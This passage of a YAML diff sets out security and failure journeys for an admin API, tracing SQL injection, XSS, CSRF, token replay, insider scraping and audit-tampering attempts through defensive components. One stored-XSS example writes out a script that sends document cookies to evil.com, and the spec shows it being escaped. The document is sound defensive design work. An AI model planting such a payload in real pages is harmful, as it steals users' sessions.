+      - node: gateway/SecurityAuditEvent
+        action: Emitted as high-severity security event — SQLi attempt through admin endpoint
+      - node: AdminErrorResponse
+        action: Assembled with 400 Bad Request — generic invalid parameter message, injection pattern not revealed
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/SQLInjector
+        action: Receives 400 Bad Request — SQL injection never reaches the database
+
+  AdminStoredXssNeutralized:
+    steps:
+      - node: _actors/XSSAttacker
+        action: "Previously created a task with title containing <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
+      - node: _actors/Admin
+        action: Requests all tasks via AdminAllTasksEndpoint to review platform content
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives GET /admin/tasks request
+      - node: auth/TokenValidator
+        action: Validates the admin session token
+      - node: auth/UserContextLoader
+        action: Loads admin user context
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — passes
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — access granted
+      - node: tasks/TaskLister
+        action: Retrieves task records including the one with the XSS payload in its title
+      - node: AdminResponseRedactor
+        action: Scans all string fields in the task list response for HTML/script content
+      - node: AdminResponseRedactor
+        action: "Escapes the <script> tags to &lt;script&gt; — payload rendered as harmless text, not executable code"
+      - node: AdminAuditLogger
+        action: Records that stored XSS content was detected and neutralized in response
+      - node: AdminAuditEntry
+        action: Created with action type xss_neutralized, affected task ID, and field name
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as security event — stored XSS payload found in task content viewed by admin
+      - node: gateway/ResponseFormatter
+        action: Formats the sanitized task list response
+      - node: _actors/Admin
+        action: Receives task list with XSS payload visible as escaped text — script does not execute
+
+  AdminCsrfAttackBlocked:
+    steps:
+      - node: _actors/CSRFAttacker
+        action: Crafts a malicious webpage that tricks the admin's browser into sending a request to AdminDashboardEndpoint while admin is logged in
+      - node: _actors/Admin
+        action: Visits the malicious webpage in the same browser where their admin session is active
+      - node: _actors/CSRFAttacker
+        action: Malicious page triggers a cross-origin fetch to GET /admin/users extracting user data
+      - node: gateway/RequestRouter
+        action: Routes the cross-origin request to users/ListUsersEndpoint
+      - node: users/ListUsersEndpoint
+        action: Receives the request with the admin's cookies automatically attached by the browser
+      - node: auth/TokenValidator
+        action: Validates the session token from the cookie — token is valid
+      - node: auth/UserContextLoader
+        action: Loads admin user context — role is admin
+      - node: AdminCsrfValidator
+        action: Checks for anti-CSRF token in request header
+      - node: AdminCsrfToken
+        action: No CSRF token found in the cross-origin request — browser did not include the custom header
+      - node: AdminCsrfTokenRequiredRule
+        action: Rejects request — CSRF token missing or invalid
+      - node: AdminAuditLogger
+        action: Records CSRF attempt with admin session ID, origin header, referer, and target endpoint
+      - node: AdminAuditEntry
+        action: Created with action type csrf_attempt_blocked, origin domain, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as security event — CSRF attack targeting admin account
+      - node: gateway/ErrorPayload
+        action: Assembled with 403 Forbidden — CSRF validation failed message
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/CSRFAttacker
+        action: Cross-origin request fails — no admin data exfiltrated via CSRF
+
+  AdminLeakedTokenExploitBlocked:
+    steps:
+      - node: _actors/TokenLeakExploiter
+        action: Discovers an admin session token leaked in application logs, error reports, or client-side debugging output
+      - node: _actors/TokenLeakExploiter
+        action: Sends request to AdminAllTasksEndpoint using the leaked admin token from an unfamiliar IP and user-agent
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the leaked token — token is cryptographically valid and not expired
+      - node: auth/UserContextLoader
+        action: Loads admin user context from the session store
+      - node: AdminSessionIntegrityChecker
+        action: Extracts source IP and user-agent from the request
+      - node: AdminSessionBinding
+        action: Looks up the bound IP and user-agent for this session
+      - node: AdminSessionIntegrityChecker
+        action: Compares against binding — both IP and user-agent mismatch
+      - node: AdminSessionBindingRule
+        action: Enforces binding — mismatch triggers session invalidation
+      - node: AdminSessionIntegrityChecker
+        action: Invalidates the leaked session token permanently
+      - node: AdminAuditLogger
+        action: Records token exploitation attempt with leaked token ID, attacking IP, user-agent, and timestamp
+      - node: AdminAuditEntry
+        action: Created with action type leaked_token_exploit, both IPs, user-agents, and session ID
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as critical security event — leaked admin token usage detected
+      - node: gateway/ErrorPayload
+        action: Assembled with 401 Unauthorized — no details about why token was rejected
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/TokenLeakExploiter
+        action: Receives 401 Unauthorized — leaked token is now permanently invalidated
+
+  MaliciousInsiderAdminAbuseDetected:
+    steps:
+      - node: _actors/MaliciousInsider
+        action: Uses legitimate infrastructure access to authenticate as admin through a backdoor or direct database session injection
+      - node: _actors/MaliciousInsider
+        action: Sends requests to AdminUserDetailEndpoint to extract sensitive user profiles
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserDetailEndpoint
+      - node: AdminUserDetailEndpoint
+        action: Receives GET /admin/users/:id request
+      - node: auth/TokenValidator
+        action: Validates the session token — token was legitimately created (via infrastructure access)
+      - node: auth/UserContextLoader
+        action: Loads admin user context — role is admin
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — IP matches (insider is on internal network)
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — access is granted
+      - node: AdminAnomalyDetector
+        action: Records access in AdminAccessPattern — detects unusual pattern (accessing user profiles sequentially by incrementing ID)
+      - node: AdminAccessPattern
+        action: Rolling window shows 50 sequential user detail requests in 2 minutes — far above baseline
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type sequential_enumeration, admin ID, request count, and time window
+      - node: users/UserReader
+        action: Loads the requested user record
+      - node: AdminResponseRedactor
+        action: Masks sensitive PII — insider sees partial data only, not raw database values
+      - node: AdminAuditLogger
+        action: Records every individual access with full detail — admin ID, target user, timestamp, source IP
+      - node: AdminAuditEntry
+        action: Created with comprehensive trail — each access individually logged for forensic correlation
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as high-severity event — anomalous admin access pattern detected
+      - node: gateway/ResponseFormatter
+        action: Formats the redacted user detail response
+      - node: _actors/MaliciousInsider
+        action: Receives redacted data — but anomaly alert has already been generated for security team review
+
+  AdminBulkDataExfiltrationDetected:
+    steps:
+      - node: _actors/DataExfiltrator
+        action: Uses a compromised admin account to systematically scrape all user data by paging through admin list endpoints
+      - node: _actors/DataExfiltrator
+        action: Sends GET /admin/users?page=1&limit=100 to begin extracting user records
+      - node: gateway/RequestRouter
+        action: Routes request to users/ListUsersEndpoint
+      - node: users/ListUsersEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token — valid admin session
+      - node: auth/UserContextLoader
+        action: Loads admin context — admin role confirmed
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — passes
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminMaxResultsRule
+        action: Enforces 100 results maximum — prevents extracting entire table in one request
+      - node: AdminAnomalyDetector
+        action: Records page 1 access in AdminAccessPattern — normal so far
+      - node: _actors/DataExfiltrator
+        action: Immediately sends pages 2, 3, 4, 5 in rapid succession to extract all records
+      - node: AdminRateLimitRule
+        action: Detects rapid sequential requests from same session — approaching rate limit threshold
+      - node: AdminAnomalyDetector
+        action: Detects rapid sequential pagination pattern — cumulative data volume exceeds normal admin usage
+      - node: AdminAccessPattern
+        action: Shows 5 page requests in 10 seconds totaling 500 user records accessed
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type bulk_data_harvesting, admin ID, pages accessed, total records, and velocity
+      - node: AdminRateLimitRule
+        action: Rate limit threshold exceeded on page 6 — subsequent requests throttled
+      - node: AdminAuditLogger
+        action: Records each page request individually with cumulative data volume tracking
+      - node: AdminAuditEntry
+        action: Each request logged with admin ID, page number, records returned, and running total
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as critical security event — bulk data exfiltration pattern detected
+      - node: AdminErrorResponse
+        action: Assembled with 429 Too Many Requests and Retry-After header
+      - node: gateway/ResponseFormatter
+        action: Formats the rate limit error response
+      - node: _actors/DataExfiltrator
+        action: Receives 429 on page 6 — partial extraction achieved but pattern detected and admin flagged for investigation
+
+  CompromisedAdminAuditTamperBlocked:
+    steps:
+      - node: _actors/CompromisedAdmin
+        action: Attempts to cover tracks by sending DELETE request to AdminAuditLogEndpoint to erase audit entries
+      - node: gateway/RequestRouter
+        action: Routes the DELETE request to AdminAuditLogEndpoint
+      - node: AdminAuditLogEndpoint
+        action: Receives the DELETE request
+      - node: AdminReadOnlyRule
+        action: Rejects the request — admin endpoints only accept GET requests, DELETE is not permitted
+      - node: AdminAuditImmutabilityRule
+        action: Enforces that audit log entries cannot be modified or deleted via any API endpoint
+      - node: AdminAuditLogger
+        action: Records the audit tampering attempt with admin ID, HTTP method DELETE, and target endpoint
+      - node: AdminAuditEntry
+        action: Created with action type audit_tamper_attempt, admin ID, method, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as critical security event — admin attempted to delete audit records
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type audit_tampering, admin ID — triggers immediate security team notification
+      - node: gateway/ErrorPayload
+        action: Assembled with 405 Method Not Allowed status
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/CompromisedAdmin
+        action: Receives 405 Method Not Allowed — audit records remain intact and the tampering attempt itself is now permanently logged
+
+  AdminReplayAttackBlocked:
+    steps:
+      - node: _actors/SessionHijacker
+        action: Captures a legitimate admin request including headers, token, and CSRF token via network interception
+      - node: _actors/SessionHijacker
+        action: Replays the exact captured request 30 seconds later to retrieve the same admin data
+      - node: gateway/RequestRouter
+        action: Routes the replayed request to the original admin endpoint
+      - node: AdminDashboardEndpoint
+        action: Receives the replayed request
+      - node: auth/TokenValidator
+        action: Validates the session token — still valid and not expired
+      - node: AdminReplayGuard
+        action: Extracts the request nonce from the replayed request
+      - node: AdminRequestNonce
+        action: Looks up the nonce in the recently-seen nonce set — nonce has already been consumed
+      - node: AdminReplayGuard
+        action: Rejects the request — nonce already used within the replay detection window
+      - node: AdminAuditLogger
+        action: Records replay attempt with nonce value, original timestamp, replay timestamp, and source IP
+      - node: AdminAuditEntry
+        action: Created with action type replay_attack_detected, nonce, time delta, and both IPs
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as security event — replayed admin request detected
+      - node: gateway/ErrorPayload
+        action: Assembled with 401 Unauthorized — generic authentication failure, replay reason not disclosed
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/SessionHijacker
+        action: Receives 401 Unauthorized — replayed request rejected, original nonce is consumed
+
+  AdminEnumerationViaTimingMitigated:
+    steps:
+      - node: _actors/AccountEnumerator
+        action: Gains admin access (or exploits leaked admin token) and probes AdminUserDetailEndpoint with sequential user IDs to enumerate valid accounts
+      - node: _actors/AccountEnumerator
+        action: Sends GET /admin/users/uuid-1 and measures response time, then sends GET /admin/users/uuid-2 and compares
+      - node: gateway/RequestRouter
+        action: Routes each request to AdminUserDetailEndpoint
+      - node: AdminUserDetailEndpoint
+        action: Receives GET /admin/users/:id request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates the UUID format — structurally valid
+      - node: users/UserReader
+        action: Queries for user by ID — user not found
+      - node: AdminTargetExistsRule
+        action: User does not exist — prepares 404 response
+      - node: AdminTargetExistsRule
+        action: Enforces constant-time response — adds artificial delay to match average successful lookup time
+      - node: AdminAnomalyDetector
+        action: Detects sequential ID probing pattern across multiple requests from same session
+      - node: AdminAccessPattern
+        action: Shows rapid sequential user detail requests with high 404 rate — enumeration signature
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type user_enumeration, admin ID, probe count, and 404 rate
+      - node: AdminAuditLogger
+        action: Records each probe with result (found/not-found) for forensic analysis
+      - node: AdminAuditEntry
+        action: Created with action type user_detail_access, target ID, result not_found, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as security event — user enumeration pattern detected via admin endpoint
+      - node: AdminErrorResponse
+        action: Assembled with 404 Not Found — constant-time response prevents timing-based enumeration
+      - node: gateway/ResponseFormatter
+        action: Formats the 404 response with consistent timing
+      - node: _actors/AccountEnumerator
+        action: Receives 404 responses — but constant-time enforcement means valid and invalid IDs are indistinguishable by timing
+
+  AdminApiAbuseThrottled:
+    steps:
+      - node: _actors/APIAbuser
+        action: Uses automated scripts to rapidly hit admin endpoints, scraping data or probing for vulnerabilities
+      - node: _actors/APIAbuser
+        action: Sends 50 requests per second to various admin endpoints using a valid admin session
+      - node: gateway/RequestRouter
+        action: Routes the flood of requests to admin endpoints
+      - node: AdminDashboardEndpoint
+        action: Receives a burst of rapid requests
+      - node: auth/TokenValidator
+        action: Validates session tokens — all valid
+      - node: AdminRateLimitRule
+        action: Counts requests in sliding window — threshold of 30 requests per minute exceeded after first batch
+      - node: AdminRateLimitRule
+        action: Begins rejecting requests — rate limit enforced at stricter admin threshold
+      - node: AdminAnomalyDetector
+        action: Detects automated request pattern — uniform timing intervals, no human browsing behavior
+      - node: AdminAccessPattern
+        action: Shows 50 requests in 1 second with zero variance in inter-request timing — bot signature
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type api_abuse_bot_detected, admin ID, request velocity, and timing pattern
+      - node: AdminAuditLogger
+        action: Records rate limit enforcement with admin ID, request count, and time window
+      - node: AdminAuditEntry
+        action: Created with action type rate_limit_exceeded, request count 50, window 1s, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as security event — automated admin API abuse detected
+      - node: AdminErrorResponse
+        action: Assembled with 429 Too Many Requests and Retry-After header
+      - node: gateway/ResponseFormatter
+        action: Formats the rate limit response
+      - node: _actors/APIAbuser
+        action: Receives 429 Too Many Requests — automated scraping blocked, admin account flagged
+
+  AdminOffHoursAccessFlagged:
+    steps:
+      - node: _actors/CompromisedAdmin
+        action: Accesses admin dashboard at 3 AM outside normal business hours using a compromised admin account
+      - node: gateway/RequestRouter
+        action: Routes request to AdminDashboardEndpoint
+      - node: AdminDashboardEndpoint
+        action: Receives GET /admin/dashboard request
+      - node: auth/TokenValidator
+        action: Validates the session token — token is valid
+      - node: auth/UserContextLoader
+        action: Loads admin user context — role is admin
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — IP and user-agent match (attacker has same credentials)
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — passes
+      - node: AdminTimeBoundAccessRule
+        action: Checks current time against configured business hours — 3 AM is outside allowed window
+      - node: AdminTimeBoundAccessRule
+        action: Triggers enhanced authentication requirement — step-up verification required
+      - node: AdminAnomalyDetector
+        action: Records off-hours access in AdminAccessPattern — correlates with admin's historical access times
+      - node: AdminAccessPattern
+        action: Shows this admin has never accessed the system between midnight and 6 AM — first-time off-hours access
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type off_hours_access, admin ID, access time, historical baseline, and confidence score
+      - node: AdminAuditLogger
+        action: Records off-hours access attempt with enhanced detail — admin ID, timestamp, geo-IP, and step-up auth required flag
+      - node: AdminAuditEntry
+        action: Created with action type off_hours_access, time, geolocation, and step_up_required flag
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as elevated security event — off-hours admin access triggers monitoring alert
+      - node: gateway/ErrorPayload
+        action: Assembled with 403 Forbidden — step-up authentication required for off-hours access
+      - node: gateway/ResponseFormatter
+        action: Formats the step-up challenge response
+      - node: _actors/CompromisedAdmin
+        action: Receives 403 requiring additional authentication — cannot proceed without the real admin's second factor
+
+  AdminGeoAnomalyBlocked:
+    steps:
+      - node: _actors/CompromisedAdmin
+        action: Accesses admin endpoint from an IP geolocated to a country where no admin has ever logged in
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token — token is valid
+      - node: auth/UserContextLoader
+        action: Loads admin user context — role is admin
+      - node: AdminSessionIntegrityChecker
+        action: Validates session binding — IP changed since session creation (VPN or travel)
+      - node: AdminSessionBinding
+        action: Bound IP does not match current request IP — possible legitimate travel or compromise
+      - node: AdminSessionBindingRule
+        action: IP mismatch detected — session invalidated
+      - node: AdminGeoRestrictionRule
+        action: Checks IP geolocation — country is outside the allowed admin access regions
+      - node: AdminGeoRestrictionRule
+        action: Blocks access — geographic restriction enforced
+      - node: AdminAuditLogger
+        action: Records geo-restricted access attempt with admin ID, expected region, actual geolocation, and IP
+      - node: AdminAuditEntry
+        action: Created with action type geo_restriction_blocked, geolocation details, and timestamp
+      - node: gateway/SecurityAuditEvent
+        action: Emitted as critical security event — admin access from unexpected geographic location
+      - node: AdminAnomalyAlert
+        action: Emitted with anomaly type geo_anomaly, expected regions, detected country, and admin ID
+      - node: gateway/ErrorPayload
+        action: Assembled with 403 Forbidden — generic access denied, geolocation detail not revealed
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/CompromisedAdmin
+        action: Receives 403 Forbidden — session invalidated, access blocked from unexpected geography
+
+  # =============================================
+  # FAILURE JOURNEYS — failures lens
+  # =============================================
+  AdminUserDetailNotFound:
+    steps:
+      - node: _actors/Admin
+        action: Requests user detail for a user ID that does not exist in the system
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserDetailEndpoint
+      - node: AdminUserDetailEndpoint
+        action: Receives GET /admin/users/:id request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: auth/UserContextLoader
+        action: Loads admin user context
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates the user ID is a well-formed UUID — passes
+      - node: users/UserReader
+        action: Queries for user by ID — no record found
+      - node: AdminTargetExistsRule
+        action: Target user does not exist — triggers 404 response
+      - node: AdminAuditLogger
+        action: Records the not-found access with admin ID and target user ID
+      - node: AdminAuditEntry
+        action: Created with action type user_detail_not_found, target ID, and timestamp
+      - node: AdminErrorResponse
+        action: Assembled with 404 Not Found — user does not exist message
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/Admin
+        action: Receives 404 Not Found
+
+  AdminTaskDetailNotFound:
+    steps:
+      - node: _actors/Admin
+        action: Requests task detail for a task ID that does not exist
+      - node: gateway/RequestRouter
+        action: Routes request to AdminTaskDetailEndpoint
+      - node: AdminTaskDetailEndpoint
+        action: Receives GET /admin/tasks/:id request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: auth/UserContextLoader
+        action: Loads admin user context
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates the task ID is a well-formed UUID — passes
+      - node: CrossUserTaskReader
+        action: Queries for task by ID — no record found
+      - node: AdminTargetExistsRule
+        action: Target task does not exist — triggers 404 response
+      - node: AdminAuditLogger
+        action: Records the not-found access with admin ID and target task ID
+      - node: AdminAuditEntry
+        action: Created with action type task_detail_not_found, target ID, and timestamp
+      - node: AdminErrorResponse
+        action: Assembled with 404 Not Found — task does not exist message
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/Admin
+        action: Receives 404 Not Found
+
+  AdminUserTasksTargetNotFound:
+    steps:
+      - node: _actors/Admin
+        action: Requests tasks for a user ID that does not exist
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserTasksEndpoint
+      - node: AdminUserTasksEndpoint
+        action: Receives GET /admin/users/:id/tasks request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: auth/UserContextLoader
+        action: Loads admin user context
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates the user ID is a well-formed UUID — passes
+      - node: users/UserReader
+        action: Queries for user by ID — no record found
+      - node: AdminTargetExistsRule
+        action: Target user does not exist — triggers 404 before loading tasks
+      - node: AdminAuditLogger
+        action: Records the not-found access attempt
+      - node: AdminAuditEntry
+        action: Created with action type user_tasks_target_not_found, target user ID, and timestamp
+      - node: AdminErrorResponse
+        action: Assembled with 404 Not Found — user does not exist message
+      - node: gateway/ResponseFormatter
+        action: Formats the error response
+      - node: _actors/Admin
+        action: Receives 404 Not Found
+
+  AdminDashboardAggregationTimeout:
+    steps:
+      - node: _actors/Admin
+        action: Requests the admin dashboard during a period of high database load
+      - node: gateway/RequestRouter
+        action: Routes request to AdminDashboardEndpoint
+      - node: AdminDashboardEndpoint
+        action: Receives GET /admin/dashboard request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: DashboardAggregator
+        action: Begins querying user and task tables for summary statistics
+      - node: AdminQueryTimeoutEnforcer
+        action: Monitors query execution time against AdminQueryTimeoutConfig dashboard threshold of 5s
+      - node: AdminQueryTimeoutConfig
+        action: Dashboard aggregation timeout is 5 seconds
+      - node: AdminQueryTimeoutEnforcer
+        action: Query exceeds 5s threshold — aborts the database query
+      - node: AdminCacheInvalidator
+        action: Checks for previously cached dashboard data
+      - node: StaleDashboardIndicator
+        action: Stale cached data exists — marks response as serving stale data
+      - node: DashboardSummary
+        action: Populated from stale cache with staleness indicator attached
+      - node: AdminAuditLogger
+        action: Records dashboard timeout with fallback to stale cache
+      - node: AdminAuditEntry
+        action: Created with action type dashboard_timeout_stale_fallback and cache age
+      - node: gateway/ResponseFormatter
+        action: Formats the stale DashboardSummary with staleness metadata in response headers
+      - node: _actors/Admin
+        action: Receives stale dashboard data with indicator that data may be outdated
+
+  AdminDashboardNoCacheFallbackTimeout:
+    steps:
+      - node: _actors/Admin
+        action: Requests the admin dashboard during high load with no cached data available
+      - node: gateway/RequestRouter
+        action: Routes request to AdminDashboardEndpoint
+      - node: AdminDashboardEndpoint
+        action: Receives GET /admin/dashboard request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: DashboardAggregator
+        action: Begins querying — database under heavy load
+      - node: AdminQueryTimeoutEnforcer
+        action: Query exceeds 5s threshold — aborts
+      - node: AdminCacheInvalidator
+        action: Checks for cached data — no cache exists (first request or cache expired)
+      - node: AdminAuditLogger
+        action: Records dashboard timeout with no cache fallback available
+      - node: AdminAuditEntry
+        action: Created with action type dashboard_timeout_no_cache
+      - node: AdminErrorResponse
+        action: Assembled with 503 Service Unavailable — dashboard temporarily unavailable
+      - node: gateway/ResponseFormatter
+        action: Formats the 503 error response with Retry-After header
+      - node: _actors/Admin
+        action: Receives 503 Service Unavailable — retry later
+
+  AdminAuditLogWriteFails:
+    steps:
+      - node: _actors/Admin
+        action: Requests admin dashboard — routine operation
+      - node: AdminDashboardEndpoint
+        action: Receives and processes the request normally
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — proceeds
+      - node: DashboardAggregator
+        action: Successfully compiles dashboard statistics
+      - node: DashboardSummary
+        action: Assembled with current data
+      - node: AdminAuditLogger
+        action: Attempts to write audit entry — primary audit store connection fails
+      - node: AuditWriteFailureEvent
+        action: Emitted with failure reason (primary store connection timeout)
+      - node: AdminAuditFailoverWriter
+        action: Attempts to write to secondary audit store — secondary also fails
+      - node: AuditWriteFailureEvent
+        action: Updated with failover failure — both stores unavailable
+      - node: AuditFailClosedRule
+        action: Audit cannot be written — fail-closed policy rejects the entire request
+      - node: AdminAuditLogger
+        action: Records the audit system failure itself via emergency logging channel
+      - node: AdminErrorResponse
+        action: Assembled with 503 Service Unavailable — audit system unavailable
+      - node: gateway/ResponseFormatter
+        action: Formats the 503 error response
+      - node: _actors/Admin
+        action: Receives 503 — request denied because audit trail could not be maintained
+
+  AdminAuditLogWriteFailsWithFallback:
+    steps:
+      - node: _actors/Admin
+        action: Requests admin user list — routine operation
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role — proceeds
+      - node: users/UserLister
+        action: Successfully retrieves user records
+      - node: AdminAuditLogger
+        action: Attempts to write audit entry — primary store connection fails
+      - node: AuditWriteFailureEvent
+        action: Emitted with primary failure reason
+      - node: AdminAuditFailoverWriter
+        action: Attempts to write to secondary audit store — secondary succeeds
+      - node: AdminAuditEntry
+        action: Written to failover store with failover flag indicating non-primary storage
+      - node: AdminAuditRequiredRule
+        action: Audit entry exists (in failover) — request may proceed
+      - node: gateway/ResponseFormatter
+        action: Formats the user list response normally
+      - node: _actors/Admin
+        action: Receives user list — unaware that audit was written to failover (transparent recovery)
+
+  AdminPaginationInvalidParams:
+    steps:
+      - node: _actors/Admin
+        action: Sends GET /admin/users?page=0&limit=-5 with invalid pagination parameters
+      - node: gateway/RequestRouter
+        action: Routes request to users/ListUsersEndpoint
+      - node: users/ListUsersEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates pagination parameters against PaginationBoundsRule
+      - node: PaginationBoundsRule
+        action: "page=0 violates >= 1 constraint; limit=-5 violates 1-100 range — both invalid"
+      - node: AdminErrorResponse
+        action: "Assembled with 400 Bad Request and field-level errors: {page: 'must be >= 1', limit: 'must be between 1 and 100'}"
+      - node: gateway/ResponseFormatter
+        action: Formats the validation error response
+      - node: _actors/Admin
+        action: Receives 400 with specific field validation errors
+
+  AdminPaginationExceedsLimit:
+    steps:
+      - node: _actors/Admin
+        action: Sends GET /admin/tasks?page=1&limit=500 requesting 500 results per page
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates pagination parameters against PaginationBoundsRule
+      - node: PaginationBoundsRule
+        action: limit=500 exceeds maximum of 100 — rejected
+      - node: AdminMaxResultsRule
+        action: Confirms maximum results cap cannot be overridden
+      - node: AdminErrorResponse
+        action: "Assembled with 400 Bad Request — {limit: 'maximum value is 100'}"
+      - node: gateway/ResponseFormatter
+        action: Formats the validation error response
+      - node: _actors/Admin
+        action: Receives 400 indicating limit exceeds maximum
+
+  AdminFilterInvalidDateRange:
+    steps:
+      - node: _actors/Admin
+        action: Sends GET /admin/audit-log?start=2025-12-31&end=2025-01-01 with start after end
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAuditLogEndpoint
+      - node: AdminAuditLogEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates date range parameters
+      - node: FilterDateRangeRule
+        action: start (2025-12-31) is after end (2025-01-01) — invalid range
+      - node: AdminErrorResponse
+        action: "Assembled with 400 Bad Request — {dateRange: 'start must be before or equal to end'}"
+      - node: gateway/ResponseFormatter
+        action: Formats the validation error response
+      - node: _actors/Admin
+        action: Receives 400 with date range validation error
+
+  AdminFilterMalformedDate:
+    steps:
+      - node: _actors/Admin
+        action: Sends GET /admin/audit-log?start=not-a-date&end=2025-06-01 with unparseable date
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAuditLogEndpoint
+      - node: AdminAuditLogEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Attempts to parse date parameters as ISO-8601
+      - node: FilterDateRangeRule
+        action: "start value 'not-a-date' is not valid ISO-8601 — parse failure"
+      - node: AdminErrorResponse
+        action: "Assembled with 400 Bad Request — {start: 'must be valid ISO-8601 date'}"
+      - node: gateway/ResponseFormatter
+        action: Formats the validation error response
+      - node: _actors/Admin
+        action: Receives 400 with date format validation error
+
+  AdminMalformedUuidParam:
+    steps:
+      - node: _actors/Admin
+        action: Sends GET /admin/users/not-a-uuid/tasks with malformed UUID parameter
+      - node: gateway/RequestRouter
+        action: Routes request to AdminUserTasksEndpoint
+      - node: AdminUserTasksEndpoint
+        action: Receives the request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: "Validates the ID parameter format — 'not-a-uuid' does not match UUID v4 pattern"
+      - node: AdminErrorResponse
+        action: "Assembled with 400 Bad Request — {id: 'must be a valid UUID'}"
+      - node: gateway/ResponseFormatter
+        action: Formats the validation error response
+      - node: _actors/Admin
+        action: Receives 400 with UUID format validation error
+
+  AdminAllTasksEmptyResult:
+    steps:
+      - node: _actors/Admin
+        action: Requests all tasks when no tasks exist in the system
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAllTasksEndpoint
+      - node: AdminAllTasksEndpoint
+        action: Receives GET /admin/tasks request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: tasks/TaskLister
+        action: Queries for all tasks — zero records found
+      - node: AdminAuditLogger
+        action: Records empty task list access
+      - node: AdminAuditEntry
+        action: Created with action type list_all_tasks, result_count 0
+      - node: gateway/ResponseFormatter
+        action: "Formats response with 200 OK — {data: [], meta: {total: 0, page: 1, limit: 100}}"
+      - node: _actors/Admin
+        action: Receives 200 with empty array and zero total in pagination metadata
+
+  AdminAuditLogEmptyResult:
+    steps:
+      - node: _actors/Admin
+        action: Requests audit log for a date range with no entries
+      - node: gateway/RequestRouter
+        action: Routes request to AdminAuditLogEndpoint
+      - node: AdminAuditLogEndpoint
+        action: Receives GET /admin/audit-log request
+      - node: auth/TokenValidator
+        action: Validates the session token
+      - node: AdminAuthorizationGuard
+        action: Confirms admin role
+      - node: AdminInputValidator
+        action: Validates date range — valid
+      - node: AdminAuditLogQueryRunner
